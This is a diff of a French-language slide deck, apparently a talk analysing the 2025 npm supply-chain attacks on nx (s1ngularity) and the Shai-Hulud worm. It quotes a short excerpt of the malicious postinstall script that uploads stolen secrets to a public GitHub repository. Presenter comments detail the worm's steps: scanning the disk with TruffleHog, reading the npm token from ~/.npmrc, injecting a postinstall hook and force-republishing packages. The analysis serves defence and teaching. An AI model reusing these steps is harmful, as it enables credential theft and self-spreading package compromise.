@@ -653,7 +653,7 @@ modus:
   - { label: Faille, value: Injection Bash dans un workflow GHA, at: '21.08', clicks: [0, 2] }
   - { label: Correctif, value: "Retiré de master mais toujours présent sur d'anciennes branches", at: '22.08', clicks: [8] }
   - { label: Exploitation, value: Une PR piégée exfiltre le token npm, at: '24.08', clicks: [4] }
-  - { label: Charge, value: Utilisation d'agents IA déjà installés pour exfiltrer des secrets, alert: true, at: '27.08' }
+  - { label: Charge, value: Utilisation d'agents IA déjà installés pour exfiltrer des secrets via Github public, alert: true, at: '27.08' }
 timeline:
   - { date: '21.08', label: Workflow vulnérable }
   - { date: '22.08', label: Correctif partiel }
@@ -816,6 +816,40 @@ const cliChecks = {
 
 </AppWindow>
 
+::window-4-2::
+
+<!-- the same script, further down: with the victim's GitHub token, it creates a public repository in their
+     account and uploads everything it found there (env, ghToken, npmrcContent, inventory…), base64-encoded three
+     times; thousands of such repositories (excerpt, from StepSecurity) -->
+<AppWindow title="nx@21.5.0 · telemetry.js (postinstall)" class="dense w-[1400px]">
+
+```js {1-2,6}
+const repoName = "s1ngularity-repository";
+const repoPayload = { name: repoName, private: false };
+// …
+githubRequest('/user/repos', 'POST', repoPayload, token)
+// …
+const uploadPath = `/repos/${repoFull}/contents/results.b64`;
+```
+
+</AppWindow>
+
+::window-4-3::
+
+<!-- the result on GitHub: a search for the repositories created by the payload, each in a victim's account
+     (screenshot from GitGuardian) -->
+<AppWindow title="github.com/search?q=s1ngularity-repository-1&type=repositories" class="w-[840px]">
+  <img src="./assets/singularity-public-repos.png" class="block w-full p-[3px] pt-[12px]" />
+</AppWindow>
+
+::window-4-4::
+
+<!-- one of these repositories: results.b64, committed with the message "Creation.". The file is base64-encoded
+     twice: the script encodes three times, and the GitHub API decodes the upload once -->
+<AppWindow title="github.com/samyi/s1ngularity-repository-1/blob/main/results.b64" class="w-[1200px]">
+  <img src="./assets/singularity-repo-example.png" class="block w-full p-[3px] pt-[12px]" />
+</AppWindow>
+
 ---
 
 # Eté 2025 : le tournant
@@ -858,3 +892,107 @@ import attacks from './data/attacks'
 
 <!-- Reprise de la slide avec les deux arbres de paquets et on montre l'auto génération-->
 
+
+---
+transition: view-transition
+---
+
+# Eté 2025 : le tournant
+
+<script setup>
+import attacks from './data/attacks'
+</script>
+
+<!-- back from the worm: same timeline, zoomed from the start;
+     the click singles out the first Shai-Hulud wave, whose name morphs into the title of the next slide -->
+<ZoomTimeline
+  :events="attacks" zoom-from="2025-07-01" zoom-label="été 2025" :reveal="false" :zoom="0"
+  :highlights="[{ name: 'Shai-Hulud', at: 1, morph: 'shai-hulud' }]"
+/>
+
+---
+transition: view-transition
+layout: case
+reveal: 1
+cols: 640px 1fr
+kicker: Affaire · septembre 2025
+subject:
+  header: Pièce 04 · paquets npm
+  flag: ■ Contaminé
+  name: Shai-Hulud
+  meta: '@ctrl/tinycolor@4.1.1 · sept. 2025'
+  fields:
+    - { label: Téléchargements, value: '2 M / semaine (@ctrl/tinycolor)' }
+    - { label: Point d'entrée, value: Token npm dans un secret GitHub Actions }
+    - { label: Paquets contaminés, value: '500+', alert: true }
+modus:
+  - { label: Point d'entrée, value: 'Un workflow poussé sur angulartics2 vole le token npm du dépôt', at: '14.09', clicks: 3 }
+  - { label: Charge, value: 'TruffleHog fouille la machine : tokens npm, GitHub, clés cloud', at: '15.09' }
+  - { label: Exfiltration, value: 'Secrets publiés dans un dépôt GitHub public « Shai-Hulud »' }
+  - { label: Propagation, value: 'Republie jusqu’à 20 paquets de chaque mainteneur touché', alert: true, at: '16.09', clicks: 4 }
+  - { label: Réponse, value: '500+ paquets retirés, npm bloque les publications du ver', at: ['22.09', '23.09'] }
+timeline:
+  - { date: '14.09', label: Premières versions piégées }
+  - { date: '15.09', label: 'Alerte, tinycolor touché' }
+  - { date: '16.09', label: Paquets CrowdStrike touchés }
+  - { date: '22.09', label: Plan de GitHub pour npm }
+  - { date: '23.09', label: Alerte de la CISA }
+---
+
+<!-- dates in UTC: earliest malicious version on 14.09 around 17h58 (rxnt-authentication@0.0.3, ReversingLabs;
+     Kaspersky points to ngx-bootstrap@18.1.4 instead); GitHub says it was notified on 14.09.
+     Entry point: post-mortem of the tinycolor maintainer (sigh.dev/posts/ctrl-tinycolor-post-mortem): an npm token
+     left as a GitHub Actions secret in angulartics2, stolen by a workflow pushed by a collaborator with admin rights.
+     Payload: StepSecurity (bundle.js in postinstall, TruffleHog, shai-hulud-workflow.yml to webhook.site, public
+     repo "Shai-Hulud", up to 20 packages per maintainer republished). Response: github.blog, 22.09
+     ("Our plan for a more secure npm supply chain"); CISA alert, 23.09.
+     The title receives the Shai-Hulud label of the timeline, as on the event-stream slide -->
+<h1><span style="view-transition-name: shai-hulud; view-transition-class: focus-text; display: inline-block; line-height: 1">Shai-Hulud</span></h1>
+
+<FocusTarget morph="shai-hulud" />
+
+::window-1::
+
+<!-- the token in the secrets of angulartics2 belonged to the maintainer's account: meant to publish angulartics2,
+     it could publish all their packages (post-mortem: "a npm token with broad publish rights", then "malicious
+     versions of 20 packages, including @ctrl/tinycolor"). Three clicks inside the window: the comment of scttcper
+     saying a new CI with an up-to-date npm token is needed to publish (github.com/angulartics/angulartics2/issues/402,
+     07.10.2021; he then asks to be added on the npm package to set it up; fine-grained npm tokens only came in 2022, so the token was a classic one), then the token, then
+     the other packages it publishes -->
+<AppWindow title="Un token classique : tous les paquets du compte" class="w-[1400px]">
+  <BroadToken />
+  <WindowStep :at="[1, 2]">
+    <AppWindow title="github.com/angulartics/angulartics2/issues/402" class="w-[1000px]">
+      <img src="./assets/angulartics2-issue-402.png" class="block w-full p-[3px] pt-[12px]" />
+    </AppWindow>
+  </WindowStep>
+</AppWindow>
+
+::window-2::
+
+<!-- the payload runs TruffleHog, an open source secret scanner, on the whole disk of the machine that installed the
+     package (StepSecurity: child_process.exec('trufflehog filesystem / --json')), then parses its results and adds
+     them to what it exfiltrates. Screenshot: the home page of TruffleHog -->
+<AppWindow title="trufflesecurity.com" class="w-[1000px]">
+  <img src="./assets/trufflehog.png" class="block w-full p-[3px] pt-0" />
+</AppWindow>
+
+::window-3::
+
+<!-- one of the repositories created by the payload in a victim's account: Shai-Hulud/data.json, the harvested
+     secrets base64-encoded twice, on one line (screenshot from Wiz, redacted by them, 16.09; Wiz counted 36 GitHub
+     users with secrets exposed this way at first, StepSecurity "hundreds" of such repositories) -->
+<AppWindow title="Shai-Hulud/data.json · dépôt public d'une victime" class="w-[1400px]">
+  <img src="./assets/shai-hulud-data-json.png" class="block w-full p-[3px] pt-[12px]" />
+</AppWindow>
+
+::window-4::
+
+<!-- the propagation told through what the payload does on the machine, four clicks inside the window: it reads the
+     npm token from ~/.npmrc and runs npm whoami to get the account, lists up to 20 packages of that account
+     (/-/v1/search?text=maintainer:…&size=20), injects "postinstall": "node bundle.js" into each and republishes
+     it (npm publish --force), and another developer installing the poisoned version starts it again on their
+     machine (StepSecurity: parses NPM_TOKEN, /whoami, the search query, republishes up to 20 packages per account) -->
+<AppWindow title="Propagation : ce que bundle.js fait sur la machine" class="w-[1400px]">
+  <WormCycle />
+</AppWindow>
